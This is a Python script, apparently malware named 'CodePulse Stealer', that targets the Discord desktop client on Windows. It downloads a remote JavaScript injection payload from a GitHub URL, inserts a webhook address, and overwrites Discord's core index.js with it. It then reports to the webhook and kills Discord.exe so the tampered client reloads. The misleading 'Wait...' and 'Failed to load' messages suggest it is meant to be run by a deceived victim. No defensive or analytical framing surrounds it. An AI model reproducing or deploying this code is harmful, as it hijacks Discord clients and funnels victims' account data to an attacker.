import re,os,requests,psutil

webhook_url = "Hook Here Monkey"

local_app_data = os.getenv('localappdata')

def inject_discord():
    for directory in os.listdir(local_app_data):
        if 'discord' in directory.lower():
            for subdirectory in os.listdir(os.path.join(local_app_data, directory)):
                if re.match(r'app-(\d*\.\d*)*', subdirectory):
                    directory_path = os.path.join(local_app_data, directory, subdirectory)
                    injection_script = requests.get("https://raw.githubusercontent.com/lnfernal/Discord-Injection/main/Injection-clean.js").text.replace("%WEBHOOK%", webhook_url)
                    
                    try:
                        index_file_path = os.path.join(directory_path, 'modules', 'discord_desktop_core-1', 'discord_desktop_core', 'index.js')
                        with open(index_file_path, 'w', encoding="utf-8") as index_file:
                            index_file.write(injection_script)
                        print("Wait...")
                        return True
                    except:
                        pass
    
    print("Failed to load. Please try again later.")
    return False

def kill_discord():
    for process in psutil.process_iter():
        if process.name() == "Discord.exe":
            process.kill()

embed = {
    "title": "Discord Injection - CodePulse Stealer",
    "color": 3447704,
    "fields": []
}

injection_successful = inject_discord()

if injection_successful:
    embed["fields"].append({"name": "Injection Status", "value": "Discord injection completed successfully.", "inline": False})
else:
    embed["fields"].append({"name": "Injection Status", "value": "Discord injection failed.", "inline": False})

response = requests.post(webhook_url, json={"embeds": [embed]})


kill_discord() 
